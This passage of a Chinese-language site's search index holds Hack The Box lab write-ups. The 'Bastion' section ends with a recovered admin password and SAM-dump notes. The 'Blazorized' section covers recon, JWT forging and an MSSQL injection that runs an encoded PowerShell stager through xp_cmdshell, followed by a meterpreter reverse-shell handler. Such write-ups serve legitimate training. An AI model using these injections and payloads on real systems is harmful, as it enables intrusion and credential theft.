\"aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==\"\nPassword: thXLHM96BeKL0ER2\n</code></pre> <p>\u62ff\u5230Administrator\u7684\u767b\u9646\u5bc6\u7801\uff1athXLHM96BeKL0ER2</p> <p>ssh\u767b\u9646\u62ff\u5230root.txt</p>"},{"location":"CTF/HTB/Windows-Bastion/index.html#_4","title":"\u603b\u7ed3","text":"<ol> <li>mount\u53ef\u4ee5\u6302\u5728windows\u5171\u4eab\u76ee\u5f55</li> <li>kali\u4e0b\u53ef\u5c06VHD\u6587\u4ef6\u901a\u8fc7qemu-nbd\u8f6c\u6362\u5230/dev/nbd0p1\u8bbe\u5907\uff0c\u901a\u8fc7mount\u6302\u8f7d</li> <li>Windows\u7cfb\u7edf\u7684\u8d26\u53f7\u5bc6\u7801\u51ed\u8bc1\u4fdd\u5b58\u5728C:/Windows/System32/Config\u76ee\u5f55\u4e0b\u7684SYSTEM\u3001SAM\u6587\u4ef6\u4e2d, \u901a\u8fc7samdump2\u547d\u4ee4\u53ef\u4ece\u4e24\u4e2a\u6587\u4ef6\u4e2d\u63d0\u53d6\u51fa\u8d26\u53f7\u7684NTLM\u51ed\u8bc1</li> <li>Windows\u7a0b\u5e8f\u5b89\u88c5\u540e\uff0c\u4f1a\u5728C:/Users//AppData/Remoting/\u76ee\u5f55\u4e2d\u4fdd\u5b58\u6570\u636e\u548c\u521b\u5efa\u914d\u7f6e\u6587\u4ef6</li> <li>mRemoteNG\u7a0b\u5e8f\u4fdd\u5b58\u7684\u8fdc\u7a0b\u767b\u9646\u51ed\u8bc1\u4fdd\u5b58\u5728C:/Users/Username/AppData/Remoting/mRemoteNG/confCon.xml\u6587\u4ef6\u4e2d, \u5bc6\u7801\u901a\u8fc7aes\u52a0\u5bc6\uff0c\u9ed8\u8ba4\u52a0\u5bc6\u5bc6\u7801\u4e3amR3m</li> </ol>"},{"location":"CTF/HTB/Windows-Blazorized/index.html","title":"\u4fe1\u606f\u641c\u96c6","text":""},{"location":"CTF/HTB/Windows-Blazorized/index.html#nmap","title":"Nmap","text":"<pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762]\n\u2514\u2500# nmap --min-rate 10000 -p- -Pn 10.10.11.22   \n...\nPORT      STATE SERVICE\n25/tcp    open  smtp\n53/tcp    open  domain\n80/tcp    open  http\n110/tcp   open  pop3\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n593/tcp   open  http-rpc-epmap\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n...\n\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762]\n\u2514\u2500# nmap -sT -sC -sV -O -p25,53,80,110,135,139,445,593,5985,9389,47001  10.10.11.22\n...\nPORT      STATE SERVICE       VERSION\n25/tcp    open  smtp?\n|_smtp-commands: Couldn't establish connection on port 25\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-title: Did not follow redirect to http://blazorized.htb\n|_http-server-header: Microsoft-IIS/10.0\n110/tcp   open  pop3?\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows XP|7|2012\nOS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2012\nOS details: Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: -1s\n| smb2-time: \n|   date: 2024-07-29T20:34:23\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n...\n</code></pre>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#fuzz","title":"\u5b50\u57df\u540dFUZZ","text":"<pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt   -c  -u 'http://blazorized.htb/' -H \"Host:FUZZ.blazorized.htb\" -fc 301,302 -mc all\n</code></pre> <p>\u6211\u672c\u5730\u626b\u63cf\u5168\u662f\u8d85\u65f6......</p> <p>\u5f97\u5230admin.blazorized.htb\u5b50\u57df\u540d</p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#port-445","title":"Port - 445","text":"<pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762]\n\u2514\u2500# smbclient -N -L 10.10.11.22\nAnonymous login successful\n\n        Sharename       Type      Comment\n        ---------       ----      -------\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.11.22 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n</code></pre> <p>\u4e0d\u5b58\u5728\u533f\u540d\u8bbf\u95ee\u3002</p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#website-80","title":"Website - 80","text":"<p>\u52a0\u5165hosts\u6587\u4ef6\u540e\u8bbf\u95ee\u3002</p> <p></p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#adminblazorizedhtb","title":"admin.blazorized.htb","text":"<p>\u5c06\u5176\u52a0\u5165hosts\u6587\u4ef6\u540e\u8bbf\u95ee</p> <p></p> <p></p> <p>\u53d1\u73b0\u9700\u8981\u51ed\u8bc1\u624d\u80fd\u591f\u767b\u5f55</p> <p></p> <p>\u53ef\u4ee5\u53d1\u73b0web\u9875\u9762\u662f\u57fa\u4e8eBlazor\u6846\u67b6\u642d\u5efa\u7684\u7f51\u7ad9\u3002</p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#js","title":"JS\u6587\u4ef6","text":"<p>\u7531\u4e8e\u8be5\u7f51\u7ad9\u7684\u524d\u7aef\u662f\u5229\u7528Blazor\u6846\u67b6\u642d\u5efa\u800c\u6210\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u8be5\u6846\u67b6\u4e0b\u624b\uff0c\u641c\u7d22\u5173\u4e8e\u8be5\u6846\u67b6\u7684\u4fe1\u606f\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053js\u6587\u4ef6\u5b9e\u73b0\u4e86\u7f51\u7ad9\u7684\u51e0\u4e2a\u7279\u5b9a\u529f\u80fd\u3002</p> <pre><code>http://blazorized.htb/_content/MudBlazor.Markdown/MudBlazor.Markdown.min.js\n\nhttp://blazorized.htb/_framework/blazor.webassembly.js\n</code></pre> <p></p> <p></p> <p>\u770b\u4e0a\u53bb\u5df2\u7ecf\u88ab\u6df7\u6dc6\u4e86\uff0c\u5bf9\u5176\u8fdb\u884c\u53cd\u6df7\u6dc6:https://www.sojson.com/jsjiemi.html</p> <p></p> <p></p> <p>\u5c06\u4ee3\u7801\u63d0\u53d6\u51fa\u6765\uff0c\u641c\u7d22_framework\uff0c\u80fd\u591f\u53d1\u73b0\u4e00\u4e2a\u9690\u85cf\u7684\u63a5\u53e3</p> <p></p> <p>\u8bbf\u95eejson\u6587\u4ef6\u53ef\u4ee5\u5f97\u5230\u4e00\u4e9bdll\u6587\u4ef6 </p> <p></p> <p>\u7ecf\u8fc7\u89c2\u5bdf\u53d1\u73b0\uff0c\u9664\u4e86\u9ed8\u8ba4\u7684Microsoft dll\u6587\u4ef6\u5916\uff0c\u8fd8\u6709\u65b0\u589e\u7684\u51e0\u4e2ablazor dll\u6587\u4ef6</p> <p>\"Blazored.LocalStorage.dll\": \"sha256-5V8ovY1srbIIz7lzzMhLd3nNJ9LJ6bHoBOnLJahv8Go=\"</p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#_2","title":"\u5141\u8bb8\u6211\u4eec\u5728\u672c\u5730\u5b58\u50a8\u4e2d\u5b58\u50a8\u548c\u68c0\u7d22\u6570\u636e","text":"<p>\"Blazorized.DigitalGarden.dll\": \"sha256-YH2BGBuuUllYRVTLRSM+TxZtmhmNitErmBqq1Xb1fdI=\"</p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#blazordigitalgarden","title":"Blazor\u5e94\u7528\u7a0b\u5e8f\u4e13\u7528\u7684\u81ea\u5b9a\u4e49\u7a0b\u5e8f\u96c6\u3002\u5305\u542b\u4e0e\u201cDigitalGarden\u201d\u7279\u6027\u6216\u529f\u80fd\u76f8\u5173\u7684\u4ee3\u7801","text":"<p>\"Blazorized.Shared.dll\": \"sha256-Bz\\/iaIKjbUZ4pzYB1LxrExKonhSlVdPH63LsehtJDqY=\"</p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#blazor","title":"\u5305\u542bBlazor\u5e94\u7528\u7a0b\u5e8f\u4e0d\u540c\u90e8\u5206\u4f7f\u7528\u7684\u5171\u4eab\u4ee3\u7801\u548c\u8d44\u6e90\u3002\u5305\u62ec\u901a\u7528\u6a21\u578b\u3001\u670d\u52a1\u6216\u5b9e\u7528\u529f\u80fd","text":"<p>\"Blazorized.Helpers.dll\": \"sha256-ekLzpGbbVEn95uwSU2BGWpjosCK\\/fqqQRjGFUW0jAQQ=\"</p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#blazor_1","title":"\u5305\u542b\u6574\u4e2aBlazor\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684\u8f85\u52a9\u51fd\u6570\u6216\u5b9e\u7528\u7a0b\u5e8f\u7684\u81ea\u5b9a\u4e49\u7a0b\u5e8f\u96c6","text":"<p>\u4e0b\u8f7d\u4e0b\u6765\u8fd9\u4e9b\u6709\u5173blazor\u7684\u914d\u7f6e\u6587\u4ef6\u67e5\u770b\u3002</p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#_3","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u4e0b\u8f7ddll\u6587\u4ef6\u540e\u4f7f\u7528DNSPY\u53cd\u7f16\u8bd1\u5de5\u5177\u6253\u5f00\u5bfb\u627e\u8fc7\u540e\u53ef\u4ee5\u53d1\u73b0jwt\u3001\u5b89\u5168\u5bc6\u94a5\u3001\u9ad8\u6743\u9650\u7528\u6237\u7b49</p> <p>dnspy\u662f\u4e00\u6b3e.Net\u5e73\u53f0\u7684\u96c6\u53cd\u7f16\u8bd1\u5668\u3001\u7a0b\u5e8f\u96c6\u7f16\u8f91\u5668\u548c\u8c03\u8bd5\u5668\u7684\u5229\u5668</p> <p></p> <p>\u5229\u7528\u5f97\u5230\u7684\u4fe1\u606f\uff0c\u751f\u6210\u4e00\u4e2aJWT\u3002</p> <p></p> <p></p> <p>\u5c06\u8fd9\u4e00\u6bb5JWT\u7684\u5185\u5bb9\u6dfb\u52a0\u5230\u672c\u5730\u5b58\u50a8\u4ee5\u8bbf\u95eeadmin\u754c\u9762</p> <p></p> <p>\u5237\u65b0\u8fdb\u5165\u3002</p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#msfshell","title":"msf\u5f39\u56deshell","text":"<p>\u5bfb\u627e\u6f0f\u6d1e\u5229\u7528\u70b9\uff0c\u53d1\u73b0http://admin.blazorized.htb/check-duplicate-post-title\u63a5\u53e3\u5904\u5b58\u5728MSSQL\u6570\u636e\u5e93SQL\u6ce8\u5165\u6f0f\u6d1e\u3002</p> <p>\u8fd9\u91cc\u76f4\u63a5\u5c1d\u8bd5\u4f7f\u7528xp_cmdshell\u6267\u884c\u53cd\u5f39shell\u547d\u4ee4\uff1a</p> <pre><code>';exec master..xp_cmdshell 'powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwBhADUATwBpAFMAaABMADkAMwBQADAAcgArAEQAQQBSAGEAcgBSAHQASwA3ADcAYQB1AHoARQBSAEYAdwBVAFUAQQBWAC8ANAA3AHQAdgBSAFUAVQBBAHAAaABjAFcAcgBBAEEAWAB2AHoAbgAvAGYAQQByAFcAbgBaADYAZABuAGQAeQBKADIAagBUAEMAbwBnAHMAcgBLAFUAeQBkAFAAWgBxAFUARwBvADAAYwB0AEkAcwBpAEkAVgBNACsARQB6AE8ATQBTAGsAaABCADUATABzAFAAZQAzACsAOQBpADEANABpAHkAYwBUAFoANAAyADgAUABvAHoAUwBlAGUAOABRAFoATQBrADgAQQB3AFoAUAA2ACsAdgA1AHMAQQBBAGgAeQBtACsATwBVAEkAeQBKAHYAagBtAFQARwBHAFoAUwBhAGYAWgBBAHUAaABHAFIATgBZAHUAcgB1ADcAdgA4AHQAZgB4AFcANABJAGQAdgBEAE4AQgBSAEUANgB3AGoAYwBIAFIAcABaAG4AaABzAHgAWABwAHYAagBDACsAVAA3AHYATwBRAEMANQByADMALwA4ADAAWQBzAEoAZwBXADUAMABtAFYAZgA2AE0ATwBMAEMARQBEAG8ANgBSAGoAQQBzAGwAcABoAC8ATQBpAHMATABFAHYAZwA0ADEAbQAxAG8AUgBNAHoAZgB6AEoAZQAzAFMAaAA5ADcATwBzAEQAWABaAFcAawBQAEcAQgBZADkAQgBlAGUAYQAyAFQAZgBGAE0AMABCADIAZwBvAHIAbQBZAHgAUQBWAEMAMwAvADkAVgBTAGkAOQBQAE4AWgBlAEsAMABJAFEAQQB4AHcAVwBDADEAbwBhAFIAdABDAHAAbQBCAGcAWABTAHMAeQAzAFUAdQBaAHcAbgB2AHEAdwBXAEYAQwBSAFEAYgB6AFEAMgAwAFcAVgBGAFgATAByAGIARwBXAFIAbwB4AC8AbAA0AE4AVQBMADkAawBMAHAAZQByAEsAOQBEACsAZwA1AGYAbgAzAEkAYgBOAGUATABUAGIARgBBAGgAeABQAEsARABYAGYAaABzAEYAQgBtAFgAagBKAC8ATAA2ACsAdgB6AEoALwB2AGEARwBhAHgARwB5AEUASABWAGkAUQAzAGcAcwBUAHoATgBVAGkATwB5AEkAQgBoAFoAUQBCAGMARQA4AE0AWgAzAEYARwB6AFEAawBoAGoANQB1ADQATABKAFEAcQBDAHcAQwBnAG0ATABuAFAARABRAHUAMgBPADMAZwBFAFcAdgA3AGcAeAB4AG0AVwA2ADcAOAB2AHYANwB2AHQAYQBIAE0ASABUAGoAZAB6AGYATgBTAHAAKwBOAEsASwByAEoAaABFAHAAbABhACsAYQArAEIAMAA2ADEARgB3ADMAbAArADMAbwBjAFgANQBDAC8AMABGAGMASgBmAHIANwBTAFcAQwBsACsAMgArAGYAUwBkAFcARQBHAE8ANQBCAEIATgA4AGkAeQB1ADgASAByAGQANwBmADMAYgAzAGsAUQAwAGoAUABVADUAeAA0AEkAYwByAHQAdgBqAEwAVgBNAHEATgBTAEUAQwBEAHkAUwBKAHEARgBjADAANQBpAFcASAByADkASABwACsATAAyADUAdABsAFcAUAA3AGwAUgByAFcAYgAxAGQAWABtAEUAcAA0AEwAagBxAC8ATQB5ADkASgBEADUAdQB2ADkAWABlAG4AKwBxAHAANwBzAC8AWgBzAGUASQAyAHgAQwBrAG4AMwAvAGQAVABiAHcAYwBJAGQAYwB5AEsAYwB1AGMASgBCAHgARQAzAHoAeABzADUAagBCAEgAWQBZADUASAA1AFgAYgBzAGgASABGAFcAUwB4AGMAUAAwAEMAVAB2ADcASgBUAHkAQQBoADkAKwBkAGwATQBjAEYARAAwAGIAdAB1ADkAZwBPAE0ATQBHAHYAZQBRAG8AcQBLAFMASwBQADAASQA1AGgATABEAFkAawBGAHkAVgBlAGgAUQAvAGkANQB6AEsAdABNAHYATwA1AHAAbQA4AEwAYgA2AG0AbAByAHAAegBYAHMAMgB6ADcAVABjAHcAeQBBAE0AeQA4AHcAawBwAG4AbAB1AGwAQgBrAE4AQQBnAHoATgBNAHMATwA1AEkAYgBwACsANAB1AEwASQB5ADQAZQBGADcAMwBEAFYARwBFAGYASQBBAEcARgAwADIAKwA2ADEAOQBBAG0AbABWADkAYwA5AHoANgBVAFoARQB4AHMAMAB1AHAAUwBHAHUAZQBaAEQAQQB3AEcAYwBzAFYASgBtAEIAcwBpAEUAMwBWAFIARAArAHgAdQBFAHcAcQBlAGMAOQBBAEQARwBOAE8AWABvAFQAawBjAGEARQAvAG8AbQA0ADAASwBMAE0AcwAwAFEAcwAvAHoAdgArAGkAaABWAE4AQgBoAEoAagBvACsAaABRADEAZgBuAFYAVQBqAEUAWQBFADkAcgB6AGoAVwBqAGMAcgBtAEIAUABUAFEATAAvAHcASAAyAEwAVQA4AHUAUwBaAEYAeABkAFMAUABwAEEAMgBnAHEAQQBBADEANwBVAFoAbABaAEkAaABMAFIAdQBsAFkAbwAvAHkAUwA4AC8AdwAzAGUAagB5AFgAbQBCADUAZwA5AEEAcQArAEIATABPAGEASgBLAE8AMQBvAFEAYgA5AFUAQQBjAHAATwBpAE0ANgAwAEcATQBPAEEAZQBTADUAbABLAGYAagBTAFQAYQBNAHMAbAAvAEoAdABqAE8AeQA2ACsAZgBwAE8AZABFADQAcgBpAGEAaQBSAFMARAB5AG4AQwAwAEwAWQBhAG0AaAA1AGoAUwBzAFcANgBtAHkAOABUAHoAbwBUAHAAWgBXAHEAdABzAFEATwAwADQAMAA3AFMAZwB4ADMAUwBZAFMAagAyAEEAYwB0AEsANQBtAHkAcwBXAGYATQBJAHgASQBNAEIASgA3AE8AWgB3AFkAYgBoAHIAaQBQAGYAZAAxAFMAQQBwAEEAbwB0AHAAMQAwAGUAdQB0AFUAbQBIAEMAcwBnAGwAcQBvAGkAYQBSAFkANgBaADUAZABFAFIAawBPAHQAWgB1AE8AdgBjADIAcwBRADYAVABqAFMAUABSAHcAMgBKAFoANwA0AG0AbwBCAGsAQgAzAGsAdgBtAEsAbgBVAFQATQBGAGsAQwBwAG4AbwAyAFcAUgBNAFEAdQA5AHoAVwBrAFUAUwBNAGMASgBaADYANgBPAFIAcwB1AFIAUABiAEUAVgBVAGQAdABsAEwATQBRACsARQBlAEwAeABaAEIATQByAGcAZQBKAEkAcQBHAEUAZAArAFcAVQAwAFAARQByADkANQA0AEgATQBiAHMAQQB6ADEAdABzAHcAdAB6AGUARAB6AE4AYwBtADIAQgA5AEIATgBqADkAMwBzAGoAawBLAGUAcABCAGsAZgBqAGEAVQBmAFYAaQB2AHQAZQBCAHEAMgBOADYANABQAG8ASwByAGUASAA4ACsAagBaAEIAaABuAG4AbgBJAEQAdQBuADcAMgBGAE0ATgBQADYAeQBQAHoAcwBiAHUAYwBMAEMAQgBYADEAdABvAGgANQBvADgAWAAyAHoAWABsAEoAcwBhAEMASQBpAG8AdAA0AGkAMgA4AGYARgB4AHkAUwAwAE8AOQBjAG0AVwA1AE4AaQBPAEkAcwBVADQAeQBuAEEAaQBnAHgAMgBlAE4ALwA1AGgAYQB5ADQARABvAFQANwBSAHAAYwBVAEEAawB5AEEAZQBJAHUAZABKAGMASwBYADAAdQBzAFkAWgBwAHAAcgBXAHAAVQA5ADUAYQA4AHIAQgBjADkATQA4AHMAKwBuAEEAYgA0AEEAVwBRAFoAVABUAGgAUABwAHAAWgAvAHcAYQBpADkAQwBXAFYAbQBQAFgAVwBJAHYASQBNAFMAeQBXAG4AOQBsAEcAeAA0AG0ARABKAHMAWABkAEcASQB5AEcAOABqAG8AaABRAFQAUQBrAHcAUgBFAEgAegBmAEgARQB5AEgARABuAGQAdABuADYAYQBRAE8AUABhADMAUgA5AG8ATgB1AEsARABCADQAawBwAE4AcQBnAGMAdwA0AFYARwBSADYAegBjAFQAcgBoADUAUwBTAFYAYgBPAGsANQA3AG0AWgAyAGYATAA5ADUAbQBnADQATwB0AHAAUQArAFYAUgAvADYAYwA3ADYATABBAGUAcwBNADEAagB0AGIANQBBAGQAagB3AEYAcgA4AHoAaQBGAGIAdwBWAHIAeQBhAFUALwBXAHQAcgBwAGwAQwB2AE0ASgBDAGQATQBOAFMAbABZAHMAcAA4AFIAUABXADgAUwA3AGQAUgBzAHQAZwBBAEgAawA1AHQAcAB4AEIAOABaAEEAMQBLAGMAdABYAFcAcwAzAEoAOQB6ADgAeQBkAHMAdgBqAE8AQQBzAGoAYQAxAE8ATwBtAEkAWAB3AG4AYgBHAE8AMABOAGgAZABxAGkAdAArADkATgBSAFAAQgBlAHgAUABLADkAMgBlAG4AegBYAEcAQQBrAG4AVgBaAGsASwB5AFgAaABSAEgAYQA2ADEAZwB6AGkAWgBXAFgAdABlAGQANwB2AEIAZABxADgAdQArAEoAbQA2ADQAZQBvAHoARwBnADkAVABYAFkAbwBjAHIANgA4AE4AWAB0AHgAWAB0AFIANQBxACsATgBMAFQANgBDAFIAbwAyADMAYQBmADAAOABQAFoAcAB0AHYAawAxAFAAawBwAGUAbwBaAEQAVwBlAEwANwBoAC8ARgBvAGgAUwBGADgAcwBFAEsAQwBTAFcAZQA5ADQAeQBCAHYAUwBkAEsAdQBOADcATwBuAEMANgA0ADkASAB6AGUANQBxAGoAcQAxADEAbwBkADEAVgBiAE8AbwAwAHUAMgBFAHQAOQB2AEoAWABoAFUAbwArADIAcQBZAGUAcABJAHcAUAB4AEcAdwBZAHEAdQB0AFcARQBhAHAAdgA1AFgAWAA2AC8ASABoAFEARwBwAHEAMQBCADYARwBVAHMATwBXAGgAZABDAHMASAB6AFgAaAArAGYAdwBzAFQAeQB5ADUAcwA0AFIASQBKAHAAYQBmAGwAWgBVAEcAbAA2AGEAdABBAEgATwB0AEoARgBHAGEAcwBpAHAAYgB6ADkAQwBFAFkAcAB5AEEARABuAFoASQB6AFIASQBQAFUAbQBxAEQANQBUAGoAYQArAHgAMQAwAEMAcgBmAFYATABWAGoAbwBzADQAZABHAHEARAB3ADkASQBiADgASgBGADMAQgBVAHQANgBvAEQAOAA2AGwANQBJAEYAVwAvAFUALwBkAHIALwBaAE0ANABRAGsATQBrAFcAZgAwAFIARwBoAHQARABVAGUARQA5AEQAaQBvADgASABQAGQAMABuACsAVwBUAGEAYQBlADYAUQBwADQAaABLAHYATQBsAHEAagAzADEAbgBzAHkAcQBOAFYAeQBaAGgAKwBHAHoAVQBaADMAaQBoAHIAeABiAEsAMABlADQAVgBPAGQATgBHAFIAeABFAEMARwBOAG4AUABlAGgARgAwAHIAUwBqAE4AdQB5AE4AWAA1ADkAagBUADYAeABkAE4AQgAxAHMAcQBWAFoAcABqAHMAcQA2AGQATQA1AHkAVgBRAGEAYgBQAEcAZgBsAEwAVwB5AFkAcAB5AFEANgBzADYARABkAFAAUgBuADkATwBFAGoAbwB2ADAAbwAxACsAYgBDAGkAYQAwAC8AWgBtAGkAQgBnAHEAYQA1AFYAZgBSAFcAYwBxAEsANQBCAGkAMwBlADUAbABtADQAdgBtADAAcwB4ADYATQAyAEkARgBQAGQAbwAzAHUAdABWAFcASQAvAGEASQBOADEAUQB2AGEAbQAyADgAYwBBAHIAeAAxAEgAYgBxAEgAZQBsAE8AVAAvAEwALwAwAHQAKwBOAHAAMQBKAFoAMgBGAHQATABzAE8AdgBlAFoAbgBjAGUAWQBSADIAUABrAG4AVwBUAGYAeQBEAG8AYwA5AEgASABEAEgAdgB4AFkANgBXAE8ARgBwAGEAcwAvAGMAUABEADMAawA1AHYASAB2AC8AOQBQAEkAbABlAGIAMgAxAGsATwAvAHoAUgB6ADIAaAAyADkAVwBiADkAMwBmAGYAYgByADMAQwBFAFgAeQBvAG0ATAAvAHEAegBGAFIAQQBRAGcAdABnAFcAawBsAHAAZAAzAFcANwBHADAAVwBQAGkATgBjAGUAYQBlAEsAaAB6AEsASgBZAC8ATAB5AHQAUAAwAEQAaQBRAGsAeABiAFgAdABvAFUAMwAyADQAVQBEAG0AUABQAHkATABxADYAWAA3AFIAWABmADcANwBYAGYASABwAHoATAB1AGkAdwB6AG4ANAA2AEsAbgAyAC8ASABFAHEAbAAyADcAVwBuAHgANwB0AGQAMwB2AHAAYwBqADMAagByAEEATAA5AGYASQAxAHQANgB2AHYASQBIAEkAaABYAG8ANwBpAE8AcgB6AEYAUwBUAGUAcgBWAGEAegBaADYATgBLAHQAMwB0ADkANABuAHAAZQBYADUAYQBmAE4AKwB2AG4AUABWACsASAA2AEIAOABkAEkAVgB6AFYAKwAvAE4ARwBvAGwAZABCAC8ANABmAFkALwBDAEQAMQAvAC8ATwBiAHMAWgBmADMAagA5ACsAWgB5ADkASAA5AEQAbABsADIAWQBYADgATAB4AHcAbgAzAHoAcgBmAEQAUQBBAEEAIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=' --+\n</code></pre> <p>\u8fd9\u91cc\u6211\u4f7f\u7528cs\u751f\u6210\u7684payload\uff0c\u4e4b\u540e\u5229\u7528msf\u76d1\u542c\u53cd\u5f39shell\u3002</p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#cspayload","title":"cs\u751f\u6210payload","text":"<p>\u6ce8\u610f\u662fx64\u67b6\u6784\u3002</p> <p></p> <p>\u5f97\u5230exp</p> <p></p> <p>\u4e4b\u540e\u5c06\u4e0a\u9762\u7684exp\u4e0e\u4ee3\u7801\u6267\u884c\u70b9\u76f8\u7ed3\u5408\u3002</p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#msfshell_1","title":"msf\u76d1\u542c\u53cd\u5f39shell","text":"<p>\u6ce8\u610f\u67b6\u6784\u662fx64</p> <pre><code>msf6 &gt; use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp\npayload =&gt; windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) &gt; set lhost 10.10.16.72\nlhost =&gt; 10.10.16.72\nmsf6 exploit(multi/handler) &gt; set lport 1234\nlport =&gt; 1234\nmsf6 exploit(multi/handler) &gt; run\n[*] Started reverse TCP handler on 10.10.16.72:1234 \n[*] Sending stage (200774 bytes) to 10.10.11.22\n[-] Meterpreter session 4 is not valid and will be closed\n[*] 10.10.11.22 - Meterpreter session 4 closed.\n[*] Sending stage (200774 bytes) to 10.10.11.22\n[*] Meterpreter session 5 opened (10.10.16.72:1234 -&gt; 10.10.11.22:52370) at 2024-08-01 05:07:18 +0800\n</code></pre> <p></p> <p></p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#sharphound","title":"sharphound\u641c\u96c6\u57df\u4fe1\u606f","text":"<p>\u4e0a\u4f20sharphound.exe</p> <p>BloodHound\u4ee5\u7528\u56fe\u4e0e\u7ebf\u7684\u5f62\u5f0f\uff0c\u5c06\u57df\u5185\u7528\u6237\u3001\u8ba1\u7b97\u673a\u3001\u7ec4\u3001Sessions\u3001ACLs\u4ee5\u53ca\u57df\u5185\u6240\u6709\u76f8\u5173\u7528\u6237\u3001\u7ec4\u3001\u8ba1\u7b97\u673a\u3001\u767b\u9646\u4fe1\u606f\u3001\u8bbf\u95ee\u63a7\u5236\u7b56\u7565\u4e4b\u95f4\u7684\u5173\u7cfb\u66f4\u76f4\u89c2\u7684\u5c55\u73b0\u5728Red Team\u9762\u524d\u8fdb\u884c\u66f4\u4fbf\u6377\u7684\u5206\u6790\u57df\u5185\u60c5\u51b5\uff0c\u66f4\u5feb\u901f\u7684\u5728\u57df\u5185\u63d0\u5347\u81ea\u5df1\u7684\u6743\u9650\u3002\u5b83\u4e5f\u53ef\u4ee5\u4f7fBlue Team\u6210\u5458\u5bf9\u5df1\u65b9\u7f51\u7edc\u7cfb\u7edf\u8fdb\u884c\u66f4\u597d\u7684\u5b89\u5168\u68c0\u6d4b\u53ca\u4fdd\u8bc1\u57df\u7684\u5b89\u5168\u6027\u3002</p> 